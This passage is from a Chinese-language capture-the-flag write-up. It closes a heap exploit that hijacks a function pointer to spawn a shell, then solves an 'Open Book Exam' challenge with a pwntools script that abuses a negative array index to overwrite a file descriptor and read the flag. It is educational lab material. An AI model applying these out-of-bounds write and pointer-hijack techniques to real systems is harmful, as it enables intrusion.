之前留下的 `<donate_bar+16>` 依舊指向 `0x1d0442e0`！

此時，當執行 `say(2)` ，就會執行 `magic()` 取得 shell 權限。

#### chunks 排列示意圖

After 
```python=
add(1, 5, b'A'*3)
add(2, 32, b'B'*30)
```

![圖片](https://hackmd.io/_uploads/SJHFXEvJ-g.png)


After 
```python=
say(2)
say(1)
add(3, 32, b'C'*30)
add(4, 8, p64(0x4013a9))
```
![圖片](https://hackmd.io/_uploads/Byd5mVvJ-l.png)

## Open Book Exam

### Decompile

完整版詳見：[File](https://github.com/yzu1103309/ctf-dump/blob/main/open_book_exam_decomp.md)

#### **重點：**

* `open_book()`：不論如何都可以 Open FLAG File
![圖片](https://hackmd.io/_uploads/S1ffQ1tyZe.png)
* `read_book()`：決定能不能讀取 Flag 的條件是 strcmp 回傳的 `cur_book`
![圖片](https://hackmd.io/_uploads/HkcEXktkZl.png)


* `write_ans()`：讀入的 v1 可以是 <= 4 的任何數，可以是負的。
    可以修改超出 `questions[]` 範圍的資料（也許覆蓋檢查條件？或是 `book_fd`？）
    ![圖片](https://hackmd.io/_uploads/ByuAMktJZg.png)
    
### objdump & CheckSec

![圖片](https://hackmd.io/_uploads/rJ0a50dJWx.png)

**PIE enabled：**
* 執行時的基底位址隨機（**無法利用絕對位址攻擊**）
* 但是**相對位址還是可以利用**

**Full RELRO**：Link Map、GOT 皆不可寫

完整 objdump 請見：[File](https://github.com/yzu1103309/ctf-dump/blob/main/open_book_exam.txt)

#### **objdump 重點：**
* `# 4010 <book_fd>`
*  `# 4050 <questions>`
*  `# 4060 <cur_book>`

`write_ans()` 中的 Bug 可以覆蓋到 `book_fd`，但是無法蓋到 `cur_book`
`<questions> 0x4050` - 0x40 Bytes 可以碰到 `book_fd`（差 64 Bytes）

### Linux FD

**Linux 中萬物皆是 File ～**
![圖片](https://hackmd.io/_uploads/B1Lqd0dJbl.png)
一個 Process 會預留這幾個 FD 給 STD 輸入輸出
後續 Open 的檔案依序從 3 開始佔用 FD **（使用目前可用的最小非負整數）**

### 解題思路

* 先 Open FLAG：佔用 FD[3]，book_fd=3，cur_book="FLAG"
    此時尚無法讀取 FLAG 內容，會被 strcmp 條件擋掉
* 再 Open 另一本書（例：Math）：佔用 FD[4]，book_fd=4，cur_book="Math"
* 想辦法覆蓋目前 book_fd，改成 3
    * 可以達成 cur_book="Math" ➜ 繞過 strcmp 檢查
    * **同時 book_fd=3，可以讀取先前開啟的 FLAG 檔案**

### Solution

```python=
from pwn import *

# p = process("./open_book_exam")
p = remote("ctf.adl.tw", 10006)

def choose(n: int):
    p.recvuntil(b"4. subit answer\n>")
    p.sendline(str(n).encode())

def open_book(idx: int):
    choose(1)
    p.recvuntil(b"5. FLAG")
    p.sendline(str(idx).encode())

def write_idx_and_val(idx: int, val: int):
    choose(3)
    p.recvuntil(b"(1~4)")
    p.sendline(str(idx).encode())
    p.recvuntil(b"ans:")
    p.sendline(str(val & 0xffffffff).encode())

def read_book():
    choose(2)
    out = p.recvuntil(b"what do you want to do?", drop=True, timeout=2)
    return out

open_book(5)

open_book(2)

write_idx_and_val(-15, 3)

leak = read_book()
print(leak.decode(errors="ignore"))

# p.interactive()
```

**爲什麼是 -15？**
* 先前提到 `questions` 與 `book_fd` 差 64 Bytes
* `questions[]` 中元素型態為 int
    以 4 bytes 為單位：要 $-64 \div 4 = -16$ 為 index 
* Code: 取 `questions[v1 - 1]`，所以輸入的 v1 要是 -15，才會剛好覆蓋 `book_fd`

### Result
![圖片](https://hackmd.io/_uploads/S1QsDIvybx.png)
